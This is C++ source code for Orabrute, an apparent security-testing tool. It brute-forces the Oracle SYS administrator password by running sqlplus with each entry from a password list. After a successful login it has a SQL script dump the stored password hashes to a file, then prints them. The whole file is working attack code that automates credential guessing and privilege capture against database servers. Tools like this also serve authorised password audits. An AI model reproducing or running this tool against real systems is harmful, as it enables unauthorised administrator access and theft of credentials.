// orabrute.cpp : Defines the entry point for the console application.
#include "stdio.h"
#include "windows.h"
#include "strsafe.h" //include here and import strsafe.lib library through the project properties.

char host[17];//IP address
char port[6];//1521 by default but could be different
char sid[31];//orcl is the default but probably different
char password[31];//stays hardcoded as it is password.txt file in same directory as the binary 
char millitimewait[6];//how long to leave between attempts
DWORD dwdmillitimewait;//variable to take convertion of millitimewait to DWORD datatype.
//This is the command we are building  sqlplus sys/passwordfromlist@<host>:<port>/<sid> as sysdba -S -L @somesql.sql

char executecmd[4095];

//escape possible command injection
int escape(char*dest, char*src)  
{
	int idest = 0, isrc = 0 ;
	while(src[isrc]) //while the current source character is non null,  
	{
		if(src[isrc] == '\"')  // if hte character is double quote 
		{
			dest[idest] = '\\'; // copy a \ to dest
			idest ++;
		}
		dest[idest] = src[isrc]; //copy the source character to dest
		isrc ++;
		idest ++;
	}
	dest[idest]=0;//null terminate the destination.
	return 1;
}


int main(int argc, char * argv[])
{
	//securezeromemory
	SecureZeroMemory(host, sizeof( host ));//making sure buffer is initialised with a null terminator to make sure that a maximum length string contains a null.
	SecureZeroMemory(port, sizeof( port ));
	SecureZeroMemory(sid, sizeof( sid ));
	SecureZeroMemory(password, sizeof( password ));
	SecureZeroMemory(millitimewait, sizeof( millitimewait ));

	FILE *pfile;
	UINT result;
	printf("Orabrute v 1.2 by Paul M. Wright and David J. Morgan:\norabrute <hostip> <port> <sid> <millitimewait>");
	//below is errorhandling to check the number of command line arguments
	if(argc!=5)//argcount 1 is always the program name
	{
		printf("not enough arguments; command should be orabrute <hostip> <port> <sid> <millitimewait>");
		return 0;
	}

	strncpy(host,argv[1],sizeof( host )-1);//take the four arguments from the command line into the program
    strncpy(port,argv[2],sizeof( port )-1);
	strncpy(sid,argv[3],sizeof( sid )-1);
	strncpy(millitimewait,argv[4],sizeof( millitimewait )-1);//how long in milliseconds to wait till SQL*Plus should carry on 


	pfile=fopen("password.txt","rb"); //open the password file
	if(pfile!=NULL)
	{
		char buffer[4096];
		int numberofchars;
		dwdmillitimewait = atoi(millitimewait);//convertion of char millitimewait to DWORD millitime wait that sleep takes
		do
		{
			numberofchars = 0;
			//read the password
			while( !feof(pfile) && ( numberofchars < sizeof( buffer ) - 1 ) )
			{
				buffer[numberofchars]=fgetc(pfile);

				if(buffer[numberofchars]=='\n' || buffer[numberofchars]==-1)
				{
					//Carriage return
					break;
				}
				if(buffer[numberofchars]!='\r')  //ignore line feed
					numberofchars++;
			}
			if (numberofchars<30)
				buffer[numberofchars]=0; //terminate string at the right point
			else 
				buffer[30]=0; //the password is too long terminate to standard oracle password length

			if(strlen(buffer)>0) 
			{
				char tmpbuffer[256];
				char tmphost[256];
				char tmpport[256];
				char tmpsid[256];

				//take the input from the user and escape
				escape(tmpbuffer, buffer);
				escape(tmphost, host);
				escape(tmpport, port);
				escape(tmpsid, sid);

				//create the command line 	
				StringCchPrintf(executecmd,sizeof( executecmd ) - 1,"sqlplus.exe -S -L \"SYS/%s@%s:%s/%s\" as sysdba @selectpassword.sql", tmpbuffer,  tmphost,  tmpport,  tmpsid);//print the concatenated command upto 4094 bytes
				//sqlplus sys/passwordfromlist@host:port/sid as sysdba -S -L @somesql.sql
				printf("%s\n",executecmd);
				result = WinExec(executecmd,SW_SHOWNORMAL);
				Sleep(dwdmillitimewait);//can tune this and take it down to 100 I have found.
				FILE *poutputfile;
				poutputfile=fopen("thepasswordsare.txt","r");
				if (poutputfile != NULL) //test to see if the password output file has been created. i.e. brute force succeeded.
				{\
					char buffer[4096];
					size_t count ;
					count =fread(buffer,1,sizeof( buffer ) - 1,poutputfile);
					fclose(poutputfile);
					buffer[count]=0;
					printf("%s\n",buffer);
					printf("You will need to delete or move thepasswordsare.txt file before running again.");
					return 0;//end the program as the passwords are now there
				}
			}
		
		}while(!feof(pfile));
		fclose(pfile);
	}
	return 0;
}